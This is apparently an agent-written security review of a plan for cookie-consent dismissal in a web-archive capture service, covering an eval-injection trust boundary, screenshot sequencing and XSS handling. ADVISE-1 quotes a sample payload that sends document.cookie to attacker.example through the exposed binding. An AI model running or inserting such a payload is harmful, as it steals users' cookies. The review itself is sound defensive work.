# Security Review: Dual-Screenshot Cookie Consent Dismissal

**Verdict: ADVISE**

---

## Summary

The plan is architecturally sound and correctly operationalizes the 12 Phase
0017 constraints. All three non-negotiable lines from the prior advisory are
respected: no caller-supplied JavaScript execution, server-controlled consent
policy, and `captureSettings` embedded in the signed WACZ manifest. Three
advisory items require attention before the implementation agent proceeds --
none are blockers, but two have a concrete wrong-default risk in the task
prompt that the implementation agent might follow literally.

---

## Advisory Items

### ADVISE-1: `eval` message handler executes page-supplied code with no sanitization

**SCOPE**: Task 1, `src/consent.js`, the `eval` message handler

**CHANGE**: The Task 1 prompt correctly states that `eval` messages come
from "vendored rules, not the caller" and that message types must be
validated against an allowlist. Both constraints are present. However, the
prompt's implementation instruction is:

> For `eval` messages specifically: evaluate `msg.code` via
> `frame.evaluate(msg.code)` and respond with `evalResp`.

This is structurally correct -- `frame.evaluate(msg.code)` is how the
upstream autoconsent Playwright runner works, and the code is injected from
the vendored script, not the API caller. But the implementation agent needs
an explicit constraint the prompt currently omits: `msg.code` arriving via
the `exposeBinding` callback originates from within the page context, not
from the vendored script at the point of calling. The page (i.e., the
captured website) could synthesize a fake autoconsent `eval` message and
inject arbitrary JavaScript back into the Worker-side page via
`frame.evaluate()`.

The trust boundary here is: the `exposeBinding` callback is invoked by any
script running on the page that calls `window.autoconsentSendMessage(...)`.
The autoconsent library calls it with `{ type: 'eval', code: '...' }` when
it needs to probe the page DOM. But any third-party script, XSS payload, or
the site itself can call `window.autoconsentSendMessage({ type: 'eval',
code: 'fetch("https://attacker.example/exfil?d=" + document.cookie)' })` and
the handler will dutifully call `frame.evaluate()` with attacker-controlled
code.

**WHY**: `exposeBinding` creates a callable that any JavaScript on the page
can invoke. The `msg.code` value in an `eval` message is not validated to
come from the autoconsent library -- it comes from wherever in the page
called the binding. This is a stored/reflected injection vector: the captured
website (or any XSS on it) can invoke `frame.evaluate()` with arbitrary
code during the capture window.

Critically, `frame.evaluate()` runs in the page context, not the Worker
context, so arbitrary code from the site cannot directly access Worker
bindings (KV, R2, BUCKET). However:
1. It can exfiltrate cookies, localStorage, or DOM content from the page via
   `fetch()` or `XMLHttpRequest` to an attacker-controlled domain (data
   exfiltration from the captured page).
2. It can manipulate the DOM before the after-screenshot is taken, enabling
   evidence fabrication (the signed "after" screenshot would not reflect the
   real post-consent page state).
3. It creates a confused-deputy scenario where the WRL capture pipeline
   executes arbitrary code on behalf of the captured site.

**TASK**: In `src/consent.js`, add a validation step before passing
`msg.code` to `frame.evaluate()`. The acceptable options in order of
preference:

Option A (preferred): Do not pass `msg.code` from the binding callback to
`frame.evaluate()` at all. Instead, maintain a queue of pending eval
requests keyed by a correlation ID that the vendored autoconsent script sets
up before injection. The code to evaluate must be enqueued by the Worker
side before the page script can request it. This eliminates the injection
vector entirely but requires understanding the autoconsent Playwright runner
internals.

Option B (pragmatic): Validate that `msg.code` is a string and length-cap
it (e.g., max 2048 bytes). Log a warning if a suspiciously long code string
arrives. This does not prevent injection but limits the blast radius of DOM
manipulation and makes exfiltration via inline payloads harder.

Option C (minimum): Add a comment explicitly documenting the trust model:
"This handler evaluates code from the page context. The risk is accepted
because: (1) the capture pipeline has no Worker-side credentials accessible
from page context; (2) any DOM manipulation only affects the current capture
session; (3) the captured URL has already been validated as non-internal."
At minimum the implementation agent must not be surprised by this trust
boundary and must not add Worker-side credentials (e.g., signing key reads)
between the `exposeBinding` setup and the `context.close()`.

The task prompt currently omits this trust-boundary discussion entirely.
Recommend adding the Option B validation + Option C documentation. Option A
is too invasive for this scope.

---

### ADVISE-2: Before-screenshot sequencing -- explicit guard against race with `addInitScript()`

**SCOPE**: Task 1, `src/capture.js`, the screenshot sequencing in `defaultRenderer()`

**CHANGE**: The plan correctly states "The 'before' screenshot MUST be taken
BEFORE injecting autoconsent" and explicitly forbids `addInitScript()`. This
is the #1 evidence integrity requirement. The task prompt enforces this
structurally by placing `page.screenshot()` before `dismissCookieConsent()`.

The gap: the plan says to call `page.exposeBinding()` as part of
`dismissCookieConsent()`, but `exposeBinding()` must be called BEFORE
navigation in Playwright to have any effect. The autoconsent Playwright
runner pattern calls `exposeBinding()` before `page.goto()`.

If the implementation agent calls `exposeBinding()` before navigation (as
required for it to work), and then calls `page.screenshot()` after
navigation, the binding exists during page load. The captured site can call
`window.autoconsentSendMessage()` during page load (before the before-
screenshot is taken) to trigger `eval` messages or otherwise influence page
state before the "first-visit" screenshot.

The correct sequencing is:
1. `page.exposeBinding()` -- sets up the communication channel (no page effect yet)
2. `page.goto()` -- navigation (binding is live, page can call it during load)
3. `page.screenshot()` -- BEFORE screenshot (binding has been live during load)
4. `page.evaluate(AUTOCONSENT_SCRIPT)` -- injects the autoconsent script
5. `page.screenshot()` -- AFTER screenshot (only after dismissal completes)

Steps 1-3 above mean the "before" screenshot can be influenced by the page
calling `window.autoconsentSendMessage()` during load (before the
AUTOCONSENT_SCRIPT is injected in step 4), even though the autoconsent
library has not yet been injected. Sites cannot call the autoconsent protocol
before the autoconsent script is injected (they do not know the binding
name), but the binding name `autoconsentSendMessage` is fixed and discoverable.

**WHY**: The evidence integrity claim is that the before-screenshot captures
"first-visit state." If the captured site can invoke the binding during page
load to modify DOM state before the before-screenshot is taken, the claim is
weakened. This is a low-probability attack (site authors would have to
specifically target the WRL binding name) but it is a real trust boundary.

**TASK**: In the task prompt for Task 1, clarify the `exposeBinding()` call
placement:

- If `exposeBinding()` can be called after `page.goto()` completes (i.e.,
  post-navigation), this is the preferred sequencing and removes the issue
  entirely. The implementation agent should test this.
- If `exposeBinding()` must be called pre-navigation (Playwright requirement),
  document this as an accepted gap with rationale: "The binding name is fixed
  but only the autoconsent script knows the protocol. Pre-navigation call is
  required by Playwright's API."

The task prompt currently says to call `exposeBinding()` "as part of
`dismissCookieConsent(page)`" which implies post-screenshot. This is correct
IF Playwright permits post-navigation `exposeBinding()`. Add an explicit
verification note: confirm in implementation that `exposeBinding()` called
after navigation is effective, and if not, document the accepted gap.

---

### ADVISE-3: `captureSettings.consent.cmpDetected` flows from autoconsent into API responses and verification page without sanitization

**SCOPE**: Task 1 `src/consent.js`, Task 2 `src/index.js` / `src/kv.js`, Task 3 `src/verify-page.js`

**CHANGE**: The `cmpDetected` field is the CMP name string returned by
autoconsent (e.g., `'cookiebot'`, `'onetrust'`). It flows from the
autoconsent library -> `consent.cmp` -> `captureSettings.consent.cmpDetected`
-> KV record -> API response JSON -> verification page.

In the verification page (Task 3), the plan shows this string being
concatenated into user-visible text:

> "Detected: " + captureSettings.consent.cmpDetected

The synthesis plan for Task 3 instructs using `textContent` for user-
supplied URL data, which is correct. But `cmpDetected` is treated as a
library-internal string (autoconsent's CMP name) rather than user-controlled
content, and the instructions do not explicitly require `textContent` for it.

Autoconsent CMP names come from a fixed registry in the library source and
are typically short lowercase identifiers (`cookiebot`, `onetrust`,
`trustarc`). In the vendored-and-pinned configuration, this set is static.
However, the same `cmpDetected` string is also stored in KV and echoed in
API responses. If a future version of autoconsent returns a CMP name with
script-like characters (e.g., from a dynamically detected CMP rule), or if
the vendored rules are updated without security review, this string could
carry XSS payload to the verification page if rendered with `innerHTML`.

**WHY**: Defense-in-depth for the XSS trust boundary. The `cmpDetected`
string originates from the captured website's behavior (autoconsent detects
which CMP the site uses), which means it is partially site-controlled. A
site could theoretically trigger a CMP rule match that returns a crafted CMP
name string.

**TASK**: In Task 3 (`src/verify-page.js`), all values derived from
`captureSettings.consent` (including `cmpDetected`, `library`, and `result`)
must use `textContent` assignment, never string concatenation into `innerHTML`
or template literals inserted via `innerHTML`. This is consistent with the
existing pattern for URL and date values.

Add an explicit note to the Task 3 prompt: "All `captureSettings.*` fields
are untrusted strings sourced ultimately from the captured site. Use
`textContent` or `setAttribute` for all of them."

This is likely already the intent given the existing pattern in
`src/verify-page.js`, but the Task 3 prompt does not state it explicitly for
`captureSettings` fields.

---

## Phase 0017 Constraint Checklist

All 12 constraints verified as present in the plan:

| # | Constraint | Status |
|---|-----------|--------|
| 1 | No caller-supplied JS execution | Present -- `autoAction: 'optOut'` is server-set, no API parameters |
| 2 | No caller-supplied CSS injection | Present -- `enableCosmeticRules: false` explicitly |
| 3 | Cookie domain scoping | N/A -- no cookie injection in this feature |
| 4 | Cookie count/size limits | N/A -- no cookie injection in this feature |
| 5 | Viewport dimension caps | Preserved -- viewport remains hardcoded 1280x720 |
| 6 | Pixel budget enforcement | Preserved -- `MAX_PAGE_HEIGHT` constraint unchanged |
| 7 | Device scale factor cap | Preserved -- hardcoded, no change |
| 8 | Wait strategy enum | Preserved -- `waitUntil: 'networkidle'` hardcoded |
| 9 | Parameterization flag in capture metadata | Present -- `captureSettings` in WACZ datapackage.json, covered by Ed25519 signature |
| 10 | Strict input validation | Present -- `enablePrehide: false` prevents pre-navigation CSS; message allowlist present |
| 11 | `serviceWorkers: 'block'` hardcoded | Present -- explicit "stays unchanged" in plan |
| 12 | Cross-domain navigation blocking hardcoded | Present -- explicit "stays unchanged" in plan |

---

## Non-Issues Noted

**`eval` message in the allowlist is not itself a concern.** The plan
correctly includes `'eval'` in the allowlist while also correctly noting that
`msg.code` originates from vendored rules. ADVISE-1 is about the trust
boundary at the binding, not about the allowlist design.

**Autoconsent supply chain risk is LOW given vendoring.** The plan vendors
the single compiled script and pins the version. This is the correct
mitigaton from Phase 0017 constraint #10. The `AUTOCONSENT_VERSION` in
`captureSettings` provides reproducibility.

**`enablePrehide: false` is correctly required.** This is the most
important autoconsent config flag for evidence integrity. The before-
screenshot must show the real CMP state, not a pre-hidden state. The plan
correctly mandates this.

**WARC URI change is backward-compatible and correctly handled.** Old bundles
retain `urn:wrl:screenshot:{url}`. New bundles use `urn:wrl:screenshot:before:{url}`
and `urn:wrl:screenshot:after:{url}`. The verifier handles both. No risk.

**`captureSettings` signature coverage is correct.** Adding a top-level
field to `datapackage.json` before the existing `resources` array means it
is automatically included in the canonicalize -> SHA-256 -> sign chain. No
signing changes needed. This is the correct architecture.

---

## Summary for Nefario

Three advisories, no blockers:

1. **ADVISE-1** (Medium): Add `msg.code` length validation in the `eval`
   handler and document the trust boundary. The implementation agent needs
   to know this trust model explicitly or they may add dangerous code near
   the binding. Add to Task 1 prompt.

2. **ADVISE-2** (Low): Verify post-navigation `exposeBinding()` effectiveness
   in Cloudflare Browser Rendering. If it must be pre-navigation, document
   the accepted gap. Add a verification note to Task 1 prompt.

3. **ADVISE-3** (Low): Explicitly require `textContent` for all
   `captureSettings.*` fields in the verification page. Add to Task 3 prompt.

None of these prevent execution from starting. They are constraints that
should be communicated to the implementation agents before Task 1 begins.
